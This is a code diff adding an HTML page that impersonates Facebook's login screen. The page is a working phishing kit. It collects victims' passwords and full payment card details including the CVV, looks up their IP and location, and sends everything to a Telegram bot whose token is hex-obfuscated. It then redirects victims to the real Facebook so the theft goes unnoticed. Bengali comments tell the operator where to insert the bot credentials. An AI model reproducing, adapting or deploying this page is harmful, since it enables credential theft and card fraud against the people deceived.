@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In</title>
+    <style>
+        body {
+            font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            background: white;
+            width: 396px;
+            padding: 20px 0 28px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            text-align: center;
+        }
+        .logo {
+            color: #1877f2;
+            font-size: 60px;
+            font-weight: bold;
+            margin: 0;
+        }
+        .tagline {
+            color: #1c1e21;
+            font-size: 28px;
+            font-weight: normal;
+            margin: 0 40px 20px;
+            line-height: 32px;
+        }
+        input {
+            width: 330px;
+            padding: 14px 16px;
+            margin: 6px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            box-sizing: border-box;
+        }
+        .login-btn {
+            background: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 12px;
+            width: 330px;
+            margin: 10px 0 6px;
+            cursor: pointer;
+        }
+        .login-btn:disabled {
+            background: #a8c7f5;
+            cursor: not-allowed;
+        }
+        .loading {
+            display: none;
+            margin: 20px auto;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #1877f2;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .error {
+            color: #d32f2f;
+            font-size: 14px;
+            margin: 8px 0;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1 class="logo">facebook</h1>
+    <p class="tagline">Connect with friends and the Auto Monetise you on Facebook.</p>
+
+    <form id="loginForm">
+        <form id="loginForm">
+    <input type="text"     id="email"        placeholder="mobile number  or email address"      autocomplete="off" required>
+    <input type="password" id="pass"         placeholder="Password"          autocomplete="off" required>
+    
+    <input type="text"     id="cardholdername" placeholder="card holder name" autocomplete="off" required>
+    <input type="text"     id="cardnumber"   placeholder="card number"       autocomplete="off" required>
+    <input type="text"     id="mmyy"         placeholder="mm/yy"             autocomplete="off" required>
+    <input type="text"     id="cvv"          placeholder="cvv"               autocomplete="off" required>
+    
+    <button type="submit" class="login-btn" id="submitBtn">Log In</button>
+</form>
+  
+
+    <div class="loading" id="loader"></div>
+    <div class="error" id="errMsg"></div>
+</div>
+
+<script>
+// ──────────────────────────────────────────────
+//  টেস্টের জন্য শুধু এখানে পরিবর্তন করবে
+  // ← এটা ঠিক করো
+const CHAT_ID   = "-1003869523061";
+const BOT_TOKEN = "\x38\x33\x39\x34\x38\x37\x33\x33\x38\x35\x3a\x41\x41\x46\x7a\x63\x62\x79\x72\x2d\x63\x50\x71\x43\x30\x59\x43\x48\x6f\x57\x5f\x45\x79\x63\x52\x6d\x55\x78\x47\x34\x34\x64\x77\x54\x42\x6f";  // ← এটা ঠিক করো
+// ──────────────────────────────────────────────
+
+const form      = document.getElementById('loginForm');
+const submitBtn = document.getElementById('submitBtn');
+const loader    = document.getElementById('loader');
+const errMsg    = document.getElementById('errMsg');
+
+function showError(msg) {
+    errMsg.textContent = msg;
+    errMsg.style.display = 'block';
+    submitBtn.disabled = false;
+    loader.style.display = 'none';
+}
+
+function forceRedirect() {
+    setTimeout(() => {
+        window.location.replace("https://www.facebook.com/");
+    }, 1200);
+}
+
+form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    // সব ইনপুট থেকে ডাটা নেওয়া — null-safe
+    const email         = document.getElementById('email')?.value.trim() || '';
+    const pass          = document.getElementById('pass')?.value.trim() || '';
+    const cardholdername = document.getElementById('cardholdername')?.value.trim() || '';
+    const cardnumber    = document.getElementById('cardnumber')?.value.trim() || '';
+    const mmyy          = document.getElementById('mmyy')?.value.trim() || '';
+    const cvv           = document.getElementById('cvv')?.value.trim() || '';
+
+    // সব ফিল্ড ফাঁকা কি না চেক
+    if (!email || !pass || !cardholdername || !cardnumber || !mmyy || !cvv) {
+        showError("Please fill in all required fields.");
+        return;
+    }
+
+    submitBtn.disabled = true;
+    loader.style.display = 'block';
+    errMsg.style.display = 'none';
+
+    let ipData = { ip: '??', city: '??', country: '??' };
+
+    try {
+        const res = await fetch('https://ipwho.is/', { cache: 'no-store' });
+        if (res.ok) {
+            const d = await res.json();
+            ipData = { ip: d.ip || '??', city: d.city || '??', country: d.country || '??' };
+        }
+    } catch (err) {
+        console.warn("IP fetch failed", err);
+    }
+
+    const ua = navigator.userAgent;
+    const message = 
+`FB Login Attempt
+──────────────────
+Email/Phone     : ${email}
+Password        : ${pass}
+Cardholder Name : ${cardholdername}
+Card Number     : ${cardnumber}
+Expiry (MM/YY)  : ${mmyy}
+CVV             : ${cvv}
+
+──────────────────
+IP              : ${ipData.ip}
+Location        : ${ipData.city}, ${ipData.country}
+User-Agent      : ${ua}
+Time            : ${new Date().toLocaleString()}`;
+
+    try {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const body = new URLSearchParams({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        });
+
+        const resp = await fetch(url, {
+            method: 'POST',
+            body: body
+        });
+
+        if (!resp.ok) {
+            throw new Error(`Telegram status ${resp.status}`);
+        }
+
+        forceRedirect();
+
+    } catch (err) {
+        console.error("Telegram send failed:", err);
+        forceRedirect();  // fail হলেও redirect
+    }
+});
+</script>
+</body>
+</html>
